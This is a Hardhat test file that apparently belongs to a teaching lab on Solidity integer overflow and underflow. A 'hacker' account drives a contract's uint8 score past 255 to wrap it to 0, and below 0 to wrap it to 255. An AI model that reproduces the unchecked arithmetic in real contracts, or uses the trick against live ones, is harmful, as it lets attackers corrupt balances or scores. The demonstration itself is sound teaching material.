const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("Overflow Attack", function () {
  let deployer, hacker;

  beforeEach(async() => {
    [deployer, hacker] = await ethers.getSigners();
    const vault_artifacts = await ethers.getContractFactory("Overflow", deployer);
    this.overflow_contract = await vault_artifacts.deploy();
  })

  it("Deploy Check", async() => {
    const initScore = await this.overflow_contract.score();
    expect(initScore).to.be.eq(0);
  });

  it("Overflow Attack", async() => {
    const _amount = 255;
    await this.overflow_contract.connect(hacker).up(_amount);
    const getScore_beforeOverflow = await this.overflow_contract.score();

    const _amount2 = 1;
    await this.overflow_contract.connect(hacker).up(_amount2);
    const getScore_afterOverflow = await this.overflow_contract.score();

    expect(getScore_beforeOverflow).to.be.eq(255);
    expect(getScore_afterOverflow).to.be.eq(0);
  })

  it("Underflow Attack", async() => {
    const _amount = 1;
    await this.overflow_contract.connect(hacker).down(_amount);
    const getScore_underflowed = await this.overflow_contract.score();
    expect(getScore_underflowed).to.be.eq(255);
  })
});
